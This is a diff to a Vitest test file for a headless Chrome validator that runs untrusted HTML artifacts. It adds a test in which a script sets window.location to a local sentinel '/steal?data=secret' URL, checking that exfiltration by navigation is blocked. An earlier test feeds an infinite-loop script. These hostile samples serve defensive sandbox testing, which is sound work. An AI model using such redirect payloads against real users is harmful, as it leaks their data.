@@ -1,3 +1,5 @@
+import { createServer } from 'node:http';
+import type { AddressInfo } from 'node:net';
 import { beforeAll, describe, expect, it } from 'vitest';
 import { makeHeadlessArtifactValidator, resolveBrowserExecutablePath } from './headlessArtifactValidator.js';
 import { FunctionalDefectError } from './artifactValidation.js';
@@ -57,6 +59,26 @@ describe.runIf(live)('headless artifact validator (live, real Chrome)', () => {
 <script>while (true) {}</script></body></html>`;
     await expect(validator({ html })).rejects.toBeInstanceOf(FunctionalDefectError);
   }, 30_000);
+
+  it('blocks a main-frame navigation away from the throwaway origin (untrusted code cannot exfiltrate)', async () => {
+    // An artifact that navigates the main frame to an external origin (window.location, or a meta-refresh)
+    // must NOT reach the network — the request interceptor allows only our throwaway origin. A sentinel
+    // server stands in for the attacker's host; it must receive zero requests. [LAW:no-silent-failure]
+    let hits = 0;
+    const sentinel = createServer((_request, response) => {
+      hits += 1;
+      response.end('ok');
+    });
+    await new Promise<void>((resolve) => sentinel.listen(0, '127.0.0.1', resolve));
+    const url = `http://127.0.0.1:${(sentinel.address() as AddressInfo).port}/steal?data=secret`;
+    const html = `<!doctype html><html><body><script>window.location = ${JSON.stringify(url)};</script></body></html>`;
+    try {
+      await validator({ html });
+    } finally {
+      sentinel.close();
+    }
+    expect(hits).toBe(0);
+  }, 20_000);
 
   it('does NOT flag a playground that uses console.error for its own logging (no false positive)', async () => {
     const html = `<!doctype html><html><body>
